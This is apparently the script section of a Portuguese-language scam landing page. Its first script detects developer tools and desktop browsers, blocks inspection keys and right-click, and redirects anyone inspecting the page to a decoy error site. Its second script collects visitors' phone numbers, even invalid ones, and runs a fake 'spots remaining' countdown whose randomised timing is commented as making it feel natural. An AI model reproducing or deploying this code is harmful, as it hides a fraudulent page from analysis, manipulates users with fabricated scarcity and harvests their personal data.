<script>
(function() {

  const target = "https://erro-no-site.vercel.app/";

  // Detectar se é mobile real
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
                   .test(navigator.userAgent);

  // Função para detetar DevTools
  function isDevToolsOpen() {
    let opened = false;

    // Método 1 - diferença normal entre outerHeight e innerHeight
    if (window.outerHeight - window.innerHeight > 160) {
      opened = true;
    }

    // Método 2 - largura anormal da janela por causa do device toolbar
    if (window.outerWidth - window.innerWidth > 160) {
      opened = true;
    }

    // Método 3 - atraso causado pelo "debugger"
    const t0 = performance.now();
    debugger;
    const t1 = performance.now();
    if (t1 - t0 > 200) {
      opened = true;
    }

    return opened;
  }


  // ==========================================================
  // NOVA REGRA: PC EM MODO MOBILE (DevTools mobile) → BLOQUEAR
  // ==========================================================
  if (!isMobile) {   // só PC

    // Se DevTools está aberto ANTES da página abrir → redireciona
    if (isDevToolsOpen()) {
      window.location.replace(target);
    }

    // Monitor contínuo — garante que qualquer tentativa é apanhada
    setInterval(function() {
      if (isDevToolsOpen()) {
        window.location.replace(target);
      }
    }, 300);
  }



  // ======================
  // JÁ EXISTIA: bloqueio total só para DESKTOP real
  // ======================
  if (!isMobile) {

    try {
      window.location.replace(target);
    } catch (e) {
      window.location.href = target;
    }

    // Bloqueio de clique direito
    document.addEventListener("contextmenu", e => e.preventDefault());

    // Bloqueio de teclas
    document.onkeydown = function(e) {
      if (e.keyCode === 123) return false; // F12
      if (e.ctrlKey && e.shiftKey && [73,67,74].includes(e.keyCode)) return false; 
      if (e.ctrlKey && e.keyCode === 85) return false; // Ctrl+U
    };

    // DevTools detection (já existente)
    setInterval(function() {
      const start = performance.now();
      debugger;
      const end = performance.now();
      if (end - start > 200) {
        window.location.replace(target);
      }
    }, 500);

    // Altura da janela (já existente)
    setInterval(function() {
      if (window.outerHeight - window.innerHeight > 160) {
        window.location.replace(target);
      }
    }, 300);

    return;
  }


  // ======================
  // MOBILE REAL
  // ======================
  // Aqui não tocamos. Tudo normal.

})();
</script>

    <script>
        const phoneInput = document.querySelector("#phoneNumber");
        const errorMsg = document.querySelector("#error-msg");
        
        const iti = window.intlTelInput(phoneInput, {
            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
            preferredCountries: ['pt', 'us', 'br', 'gb', 'ao', 'mz', 'fr'],
            separateDialCode: true,
            formatOnDisplay: true,
            autoPlaceholder: "polite"
        });

        function handleSubmit(event) {
            event.preventDefault();
            
            // Mesmo que o número seja inválido, vamos mostrar uma mensagem mas ainda redirecionar
            if (!iti.isValidNumber()) {
                errorMsg.style.display = "block";
                errorMsg.textContent = "This number is not valid, but we'll try to search anyway.";
                errorMsg.style.color = "#FF3B30";
                // Não retornamos aqui para permitir o redirecionamento mesmo com número inválido
            } else {
                errorMsg.style.display = "none";
            }
            
            const phoneNumber = iti.getNumber();
            localStorage.setItem('phoneNumber', phoneNumber);
            
            // Simular progresso
            const progressBar = document.querySelector('.progress');
            progressBar.style.width = '100%';
            
            // Redirecionar aps um pequeno atraso
            setTimeout(() => {
                const params = new URLSearchParams(window.location.search);
				params.set('pg', 2); 
				window.location.href = 'etapa2/index.html';
            }, 500);
			
        }

        window.addEventListener('load', function() {
            localStorage.removeItem('phoneNumber');
        });

        phoneInput.addEventListener('input', () => {
            if (iti.isValidNumber()) {
                errorMsg.style.display = "none";
                phoneInput.style.borderColor = "#006B54";
            } else {
                phoneInput.style.borderColor = "#e0e0e0";
                errorMsg.style.display = "none"; // Só mostrar erro ao tentar enviar
            }
        });

        // Estilizao da mensagem de erro
        errorMsg.style.marginTop = "8px";
        errorMsg.style.fontSize = "14px";
        errorMsg.style.fontWeight = "500";
        
        // Cdigo corrigido do cronômetro de vagas com variaão natural na velocidade
        // Primeiro definimos a varivel spotsCount antes de usá-la
        const spotsCount = document.querySelector("#spots-count");
        
        // Inicializamos a variável spots
        let spots = 250;
        
        // Função para gerar um intervalo de tempo aleatório entre min e max
        function getRandomInterval(min, max) {
            return Math.floor(Math.random() * (max - min + 1) + min);
        }
        
        // Função para atualizar o contador com intervalo variável
        function updateCounter() {
            if (spots > 1) {
                spots--;
                spotsCount.textContent = spots;
                
                // Determina o próximo intervalo com base no nmero de spots restantes
                let nextInterval;
                
                if (spots > 200) {
                    // No início, mais lento
                    nextInterval = getRandomInterval(300, 600);
                } else if (spots > 100) {
                    // Velocidade média
                    nextInterval = getRandomInterval(200, 400);
                } else if (spots > 50) {
                    // Mais rápido
                    nextInterval = getRandomInterval(150, 300);
                } else if (spots > 20) {
                    // Ainda mais rápido
                    nextInterval = getRandomInterval(100, 200);
                } else {
                    // Muito rápido no final
                    nextInterval = getRandomInterval(50, 150);
                }
                
                // Às vezes, pausa por um momento para criar sensação de naturalidade
                if (Math.random() > 0.8) {
                    nextInterval += getRandomInterval(500, 1500);
                }
                
                // Agenda a próxima atualização
                setTimeout(updateCounter, nextInterval);
            }
        }
        
        // Inicia o contador com um pequeno atraso inicial
        setTimeout(updateCounter, getRandomInterval(200, 500));
    </script>
